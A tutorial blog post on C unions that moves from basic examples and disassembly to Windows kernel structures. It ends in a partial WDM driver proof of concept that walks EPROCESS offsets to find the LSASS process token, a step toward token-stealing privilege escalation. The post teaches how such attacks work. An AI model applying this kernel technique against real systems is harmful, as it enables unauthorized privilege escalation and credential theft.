<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>C Unions in Windows kernel exploitation | halcyondream</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="C Unions in Windows kernel exploitation" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Most people who learn C after a language like Python or JavaScript are stumped at the concept of the union, a native C data type. Unions look like structures, but their behavior couldn’t be farther from it. If C is meant to abstract raw assembly, the union is a subtle reminder that you are, at all times, just one step away from writing low-level code." />
<meta property="og:description" content="Most people who learn C after a language like Python or JavaScript are stumped at the concept of the union, a native C data type. Unions look like structures, but their behavior couldn’t be farther from it. If C is meant to abstract raw assembly, the union is a subtle reminder that you are, at all times, just one step away from writing low-level code." />
<link rel="canonical" href="http://localhost:4000/2025/05/03/C-Unions-in-Windows-kernel-exploitation.html" />
<meta property="og:url" content="http://localhost:4000/2025/05/03/C-Unions-in-Windows-kernel-exploitation.html" />
<meta property="og:site_name" content="halcyondream" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-05-03T00:00:00-04:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="C Unions in Windows kernel exploitation" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-05-03T00:00:00-04:00","datePublished":"2025-05-03T00:00:00-04:00","description":"Most people who learn C after a language like Python or JavaScript are stumped at the concept of the union, a native C data type. Unions look like structures, but their behavior couldn’t be farther from it. If C is meant to abstract raw assembly, the union is a subtle reminder that you are, at all times, just one step away from writing low-level code.","headline":"C Unions in Windows kernel exploitation","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2025/05/03/C-Unions-in-Windows-kernel-exploitation.html"},"url":"http://localhost:4000/2025/05/03/C-Unions-in-Windows-kernel-exploitation.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="halcyondream" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">halcyondream</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">C Unions in Windows kernel exploitation</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2025-05-03T00:00:00-04:00" itemprop="datePublished">May 3, 2025
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>Most people who learn C after a language like Python or JavaScript are stumped at the concept of the union, a native C data type. Unions look like structures, but their behavior couldn’t be farther from it. If C is meant to abstract raw assembly, the union is a subtle reminder that you are, at all times, just one step away from writing low-level code.</p>

<p>This walkthrough will explore unions beyond the surface level. We’ll start with some basics, refer to specifications, then look at a few examples. We’re also going to look at how they appear in the Windows kernel, keeping an eye on offensive tradecraft.</p>

<h1 id="about-unions">About Unions</h1>

<p>Here’s a simple union definition:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">union</span> <span class="n">foo_u</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>This union has two fields: an integer <em>i</em> and a byte <em>c</em>. We can use it in code like such:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">union</span> <span class="n">foo_u</span> <span class="n">foo</span><span class="p">;</span>
  <span class="n">foo</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="mi">21</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"foo.i: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">foo</span><span class="p">.</span><span class="n">i</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This will print <code class="language-plaintext highlighter-rouge">foo.i: 21</code> to the console. The disassembly looks something like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    1139:       55                      push   rbp
    113a:       48 89 e5                mov    rbp,rsp
    113d:       48 83 ec 10             sub    rsp,0x10
    1141:       c7 45 fc 15 00 00 00    mov    DWORD PTR [rbp-0x4],0x15
    1148:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
    114b:       89 c6                   mov    esi,eax
    114d:       48 8d 05 b0 0e 00 00    lea    rax,[rip+0xeb0]
    1154:       48 89 c7                mov    rdi,rax
    1157:       b8 00 00 00 00          mov    eax,0x0
    115c:       e8 cf fe ff ff          call   1030 &lt;printf@plt&gt;
    1161:       b8 00 00 00 00          mov    eax,0x0
    1166:       c9                      leave
    1167:       c3                      ret
</code></pre></div></div>

<p>This sets EAX to 0x15 (21).</p>

<p>Now, let’s modify the main function to use the <code class="language-plaintext highlighter-rouge">c</code> property:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">union</span> <span class="n">foo_u</span> <span class="n">foo</span><span class="p">;</span>
  <span class="n">foo</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="mi">21</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"foo.i: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">foo</span><span class="p">.</span><span class="n">i</span><span class="p">);</span>
  <span class="n">foo</span><span class="p">.</span><span class="n">c</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"foo.c %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">foo</span><span class="p">.</span><span class="n">c</span><span class="p">);</span>
</code></pre></div></div>

<p>Will print</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foo.i: 21
foo.c: A
</code></pre></div></div>

<p>Let’s take another look at the disassembly:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    1139:       55                      push   rbp
    113a:       48 89 e5                mov    rbp,rsp
    113d:       48 83 ec 10             sub    rsp,0x10
    1141:       c7 45 fc 15 00 00 00    mov    DWORD PTR [rbp-0x4],0x15
    1148:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
    114b:       89 c6                   mov    esi,eax
    114d:       48 8d 05 b0 0e 00 00    lea    rax,[rip+0xeb0]
    1154:       48 89 c7                mov    rdi,rax
    1157:       b8 00 00 00 00          mov    eax,0x0
    115c:       e8 cf fe ff ff          call   1030 &lt;printf@plt&gt;
    1161:       c6 45 fc 41             mov    BYTE PTR [rbp-0x4],0x41
    1165:       0f b6 45 fc             movzx  eax,BYTE PTR [rbp-0x4]
    1169:       0f b6 c0                movzx  eax,al
    116c:       89 c6                   mov    esi,eax
    116e:       48 8d 05 9a 0e 00 00    lea    rax,[rip+0xe9a]
    1175:       48 89 c7                mov    rdi,rax
    1178:       b8 00 00 00 00          mov    eax,0x0
    117d:       e8 ae fe ff ff          call   1030 &lt;printf@plt&gt;
    1182:       b8 00 00 00 00          mov    eax,0x0
    1187:       c9                      leave
    1188:       c3                      ret
</code></pre></div></div>

<p>At offset 0x1141, the memory that holds the union <code class="language-plaintext highlighter-rouge">rbp-0x4</code> is still set to 0x15 (21) just as before. So, the first part of the code has not changed.</p>

<p>However, that <em>same exact memory location</em> is also used to hold 0x41 (‘A’). We can modify the each print statement to get a better idea of what’s happening in memory:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">union</span> <span class="n">foo_u</span> <span class="n">foo</span><span class="p">;</span>
  <span class="n">foo</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="mi">21</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"foo.i: %016x, foo.c: %016x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">foo</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">foo</span><span class="p">.</span><span class="n">c</span><span class="p">);</span>
  <span class="n">foo</span><span class="p">.</span><span class="n">c</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"foo.i: %016x, foo.c: %016x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">foo</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="n">foo</span><span class="p">.</span><span class="n">c</span><span class="p">);</span>
</code></pre></div></div>

<p>This will print the 8-byte (64-bit) hex representation of each property:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foo.i: 0000000000000015, foo.c: 0000000000000015
foo.i: 0000000000000041, foo.c: 0000000000000041
</code></pre></div></div>

<p>The same memory location is used for both fields. When you set one field to a value, all other fields will use that same value. What’s the point?</p>

<p>You can think of union fields as ways to cast data at some location. When you set any field in a union, it will update some location in memory. In this case, if you access the <em>i</em> field, it will cast that data as an integer. If you access the <em>c</em> field, it will cast that data as a character. Unlike structures, when you set the value of a union’s field, you will overwrite the entire space allocated for that union (minus padding for alignment).</p>

<p>This matches the type’s definition in the ISO C 98 standard:</p>

<blockquote>
  <p>A <em>union type</em> describes an overlapping nonempty set of member of objects, each of which has anoptionally specified name and possibly distinct type.</p>
</blockquote>

<p>Put another way, you can store a DWORD and a BYTE in the same four-byte region. If you had defined this as a struct, the size would be five bytes and would occupy eight bytes total (due to alignment). Compared to structs, unions are a counterintuitive way to save memory.</p>

<p>This is one major reason why people might use unions: to save memory. The savings can prove crucial on systems with memory restrictions, or for components, like kernels, where you want to optimize memory usage.</p>

<p>One obvious caveat here is that you can lose track of which property is in use at a given time. If you’re not aware of that, you may try to write unions as though they were structs. Consider the following buggy code:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">foo</span><span class="p">.</span><span class="n">i</span> <span class="o">=</span> <span class="mi">21</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"My favorite number is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">foo</span><span class="p">.</span><span class="n">i</span><span class="p">);</span>
  <span class="n">foo</span><span class="p">.</span><span class="n">c</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"My favorite number is still %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">foo</span><span class="p">.</span><span class="n">i</span><span class="p">);</span>
</code></pre></div></div>

<p>The “bug”:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My favorite number is 21
My favorite number is still 65
</code></pre></div></div>

<p>This otherwise-annoying runtime bug could lead to a potentially devastating information leaks with a union like:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="k">union</span> <span class="n">UserInfo_u</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
  <span class="kt">int</span>  <span class="n">birthyear</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">password</span><span class="p">;</span>
  <span class="kt">int</span>  <span class="n">creditCardNumber</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span> 
<span class="nf">SetUsername</span><span class="p">(</span><span class="k">union</span> <span class="n">UserInfo_u</span> <span class="o">*</span><span class="n">user</span><span class="p">);</span>

<span class="kt">void</span>
<span class="nf">SetSecurePassword</span><span class="p">(</span><span class="k">union</span> <span class="n">UserInfo_u</span> <span class="o">*</span><span class="n">user</span><span class="p">);</span>

<span class="kt">int</span> 
<span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">union</span> <span class="n">UserInfo_u</span> <span class="n">user</span><span class="p">;</span>
  <span class="n">SetUsername</span><span class="p">(</span><span class="o">&amp;</span><span class="n">user</span><span class="p">);</span>
  <span class="n">SetSecurePassword</span><span class="p">(</span><span class="o">&amp;</span><span class="n">user</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Username: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">username</span><span class="p">);</span>
<span class="p">}</span>

<span class="p">...</span>

<span class="c1">// $ gcc userinfo.c -o userinfo</span>
<span class="c1">// $ ./userinfo</span>
<span class="c1">// Username: S3cure_Pa$$w0rd</span>
</code></pre></div></div>

<p>For this reason, it’s common to see different patterns that indicate which “property” is currently in use.</p>

<p>An obvious solution is to use a module-level or global variable. An obvious caveat is that you’re now tracking different variables that refer to the same data.</p>

<p>Another solution is to encapsulate the union in a structure which tracks the current type. Consider the example:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">SomeUnion_u</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">property</span><span class="p">;</span>
  <span class="k">union</span> <span class="n">data</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">foo_A</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">foo_B</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">foo_C</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">foo_D</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">foo_E</span><span class="p">;</span>
  <span class="p">};</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">property</code> field is honestly an arbitrary data type. An <code class="language-plaintext highlighter-rouge">int</code> would let you “select” the current field to use, similar to how an index in an array lets you select which element you want. Unlike an array, a union may have variable data types, so this might be an acceptable way to abstract data for some purpose.</p>

<p>With 64-bit alignment, the <code class="language-plaintext highlighter-rouge">SomeUnion_u</code> union only takes up only 8 bytes. If it were a struct instead, it would be closer to 40 bytes. If you had an array of such structs, it could take over 4x the amount of space.</p>

<p>This approach is simple but, unfortunately, also naive. You still have to allocate extra space to work with the “property” field. In addition, because there are so many different types, it should make you wonder if a struct wouldn’t be a better choice, albeit at a storage cost.</p>

<p>Because of these reasons, you’re likely not to see unions as a way to naively replace structures. You are far more likely to see them as a creative way to manipulate data in some memory space. The Windows kernel has a few examples of ways to do this.</p>

<h1 id="using-data-bitfields">Using data bitfields</h1>

<p>Let’s consider a use case where you want to manipulate specific bits in a byte, word, dword, or qword. Traditionally, this is handled through bit-mask operations (AND’ing or OR’ing). They work, and they’re good to know, but the syntax is pretty ugly.</p>

<p>Unions let you handle the bits without all the ugly bit-mask syntax.</p>

<p>For example, consider:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">union</span> <span class="n">DataWithBitfields_u</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">data</span><span class="p">;</span>
  <span class="k">struct</span>
  <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bit1</span><span class="o">:</span>   <span class="mi">1</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bit2_3</span><span class="o">:</span> <span class="mi">2</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bit4</span><span class="o">:</span>   <span class="mi">1</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">nibble1</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span>
  <span class="p">};</span>
<span class="p">};</span>
</code></pre></div></div>

<p>Here, we have a one-byte union: an unsigned char, which can be evaluated at face value; and an eight-bit struct, which allows us to operate on bits 1, 2, 3, 4, and the last four bits, independently. This gives us two ways to handle the same data at this byte.</p>

<p>Each bit can be manipulated as a property. However, if you want to evaluate the entire 8-bit (1 byte) space of memory, you can do it by accessing the <code class="language-plaintext highlighter-rouge">data</code> field directly. It works because it all refers to the same exact data.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="k">union</span> <span class="n">DataWithBitfields_u</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">data</span><span class="p">;</span>
  <span class="k">struct</span>
  <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bit1</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bit2_3</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bit4</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">nibble1</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span>
  <span class="p">};</span>
<span class="p">};</span>

<span class="kt">int</span> 
<span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">union</span> <span class="n">DataWithBitfields_u</span> <span class="n">u</span><span class="p">;</span>
  <span class="n">u</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">u</span><span class="p">);</span>
  <span class="n">u</span><span class="p">.</span><span class="n">bit4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">u</span><span class="p">);</span>
  <span class="n">u</span><span class="p">.</span><span class="n">bit4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">u</span><span class="p">.</span><span class="n">bit2_3</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Using bitfields in this way is a common development pattern in the EPROCESS structure, a data type used in the Windows kernel to store information about processes. You’ll notice this in the <code class="language-plaintext highlighter-rouge">Flags2</code> field:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_EPROCESS</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="k">union</span>
    <span class="p">{</span>
        <span class="n">ULONG</span> <span class="n">Flags2</span><span class="p">;</span>                              <span class="c1">//0x460</span>
        <span class="k">struct</span>
        <span class="p">{</span>
            <span class="n">ULONG</span> <span class="n">JobNotReallyActive</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>            <span class="c1">//0x460</span>
            <span class="n">ULONG</span> <span class="n">AccountingFolded</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>              <span class="c1">//0x460</span>
            <span class="n">ULONG</span> <span class="n">NewProcessReported</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>            <span class="c1">//0x460</span>
            <span class="n">ULONG</span> <span class="n">ExitProcessReported</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>           <span class="c1">//0x460</span>
            <span class="p">...</span>
            <span class="n">ULONG</span> <span class="n">ProcessStateChangeInProgress</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>  <span class="c1">//0x460</span>
            <span class="n">ULONG</span> <span class="n">InPrivate</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>                     <span class="c1">//0x460</span>
        <span class="p">};</span>
    <span class="p">};</span>
</code></pre></div></div>

<p>In this way, the properties of Flags2 can be set by accessing any of these fields, most of which refer to a specific bit in the 32-bit structure. Flags2 itself is 32 bits (ULONG) and can be accessed directly to get the four-byte value of all these bits. You can see this in the debugger:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; dt _eprocess ffffe48455c32240
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   ...
   +0x460 Flags2           : 0xd000
   +0x460 JobNotReallyActive : 0y0
   +0x460 AccountingFolded : 0y0
   +0x460 NewProcessReported : 0y0
   +0x460 ExitProcessReported : 0y0
   ...
   +0x460 ProcessStateChangeInProgress : 0y0
   +0x460 InPrivate        : 0y0
</code></pre></div></div>

<p>The developer has two ways to evaluate the value of Flags 2: using the four-byte dword, or by assessing each bit or bitfield individually. The kernel has the flexibility to evaluate these bit fields on their own or to evaluate the entire four-byte DWORD as a whole. Thanks to the union, there are many ways to manipulate the same data.</p>

<h1 id="using-trivial-bitfields">Using trivial bitfields</h1>

<p>Another approach could use some bytes for data, but leave the last N bits for other data, such as flags or properties.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">union</span> <span class="n">AnotherUnion_u</span> 
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">stackLocation</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">flags</span><span class="o">:</span><span class="mi">3</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>This union will compile to 8 bytes: enough to hold a 64-bit address plus some extra information. Note, however, that the final 3 bits of the last byte will be some value between 0 - 7.</p>

<p>Obviously, this could be a problem in another architecture. But 64-bit stacks are 8-byte aligned. This means, the last digit in the last byte will always be 0 or 8. A developer could design their application to “mask out” the last 3 bits and get an address to the stack:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; hex(0x01234567 &amp; ~0xf)
'0x1234560'
</code></pre></div></div>

<p>At the same time, you can use those last three bits to hold some information that may prove useful:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; hex(0x01234567 &amp; 0xf)
'0x7'
</code></pre></div></div>

<p>In this way, technically, neither field in the union is “modified.” The address is assumed to be byte-aligned in a way that ignores the flags. Those last three bits can coexist until the address is needed, in which case, the developer can just separate that information.</p>

<p>This is exactly what happens with the <code class="language-plaintext highlighter-rouge">_EX_FAST_REF</code> structure in the windows kernel:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_EX_FAST_REF</span> 
<span class="p">{</span> 
  <span class="k">union</span> 
  <span class="p">{</span> 
    <span class="n">VOID</span><span class="o">*</span> <span class="n">Object</span><span class="p">;</span>       <span class="c1">//0x0 </span>
    <span class="n">ULONGLONG</span> <span class="n">RefCnt</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span> <span class="c1">//0x0 </span>
    <span class="n">ULONGLONG</span> <span class="n">Value</span><span class="p">;</span>    <span class="c1">//0x0</span>
  <span class="p">};</span> 
<span class="p">};</span>
</code></pre></div></div>

<p>In WinDbg, you can see that all fields have the same offset. As observed from the sample code earlier, this indicates a union type:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; dt nt!_EX_FAST_REF
   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits
   +0x000 Value            : Uint8B
</code></pre></div></div>

<p>This union exists within an EPROCESS struct, which, as noted earlier, tracks the state of a given process. To further explore, we can attach WinDbg to a kernel session, open PowerShell as an administrator, and analyze that now-privileged PowerShell process:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; dt _eprocess ffffe48455c32240 token
ntdll!_EPROCESS
   +0x4b8 Token : _EX_FAST_REF
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">_EX_FAST_REF</code> union holds a pointer to the process’ token. Depending on the process, the token can give you elevated or administrative privileges. Processes like LSASS give you a high-enough privilege for many red-team engagements or real-world malware. Because of that, it is the topic of many writeups.</p>

<p>Unfortunately, the pointer in the union is not correctly aligned by default:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; dt _ex_fast_ref ffffe48455c32240+0x4b8
ntdll!_EX_FAST_REF
   +0x000 Object           : 0xffffbb04`90d2106d Void
   +0x000 RefCnt           : 0y1101
   +0x000 Value            : 0xffffbb04`90d2106d
</code></pre></div></div>

<p>The <em>RefCnt</em> bits <code class="language-plaintext highlighter-rouge">1101</code> will need to be dropped in order to get the token’s location:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; hex ( 0xffffbb0490d2106d &amp; ~0xf )
'0xffffbb0490d21060'
</code></pre></div></div>

<p>You can confirm your findings using the “easy way” in WinDbg:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; !token 0xffffbb0490d21060
_TOKEN 0xffffbb0490d21060

    // Token data dumps here...
</code></pre></div></div>

<p>From the attacker’s point of view, it’s useful to know that the underlying data type of an <code class="language-plaintext highlighter-rouge">EX_FAST_REF</code> is a union. Knowing this, we can discard the last three bits of <em>RefCnt</em>, because we know it’s extra data, not part of the token’s address.</p>

<h1 id="exploitation-example">Exploitation example</h1>

<p>We can use the following driver code for WDM to get an LSASS token. This is just proof-of-concept code, littered with manual offsets, and targeting one specific Windows version (Windows 10 2H22). It’s important to note that the Windows Driver Kit does not include many definitions, including the full EPROCESS structure, so we use offsets to get the same data “the hard way.”</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">QWORD</span><span class="o">*</span>
<span class="nf">GetLsassToken</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">PEPROCESS</span> <span class="n">process</span> <span class="o">=</span> <span class="n">PsInitialSystemProcess</span><span class="p">;</span>

    <span class="c1">// EPROCESS.activeProcessLinks at offset EPROCESS+0x448</span>
    <span class="n">PLIST_ENTRY</span> <span class="n">activeProcessLinks</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLIST_ENTRY</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">process</span><span class="o">+</span><span class="mh">0x448</span><span class="p">);</span>
    
    <span class="c1">// EPROCESS.ImageFileName at offset EPROCESS+0x5a8</span>
    <span class="n">PCHAR</span> <span class="n">imageFileName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">process</span> <span class="o">+</span> <span class="mh">0x5a8</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="n">QWORD</span><span class="o">*</span> <span class="n">tokenPtr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// KPROCESS base at EPROCESS.activeProcessLinks-0x448</span>
        <span class="n">process</span> <span class="o">=</span> <span class="p">(</span><span class="n">PEPROCESS</span><span class="p">)(((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">activeProcessLinks</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x448</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">process</span> <span class="o">==</span> <span class="n">PsInitialSystemProcess</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
        <span class="n">imageFileName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">process</span> <span class="o">+</span> <span class="mh">0x5a8</span><span class="p">);</span>
        <span class="n">activeProcessLinks</span> <span class="o">=</span> <span class="n">activeProcessLinks</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_strnicmp</span><span class="p">(</span><span class="n">imageFileName</span><span class="p">,</span> <span class="s">"lsass.exe"</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="n">KdPrintEx</span><span class="p">((</span><span class="n">DPFLTR_IHVDRIVER_ID</span><span class="p">,</span> <span class="n">DPFLTR_INFO_LEVEL</span><span class="p">,</span>
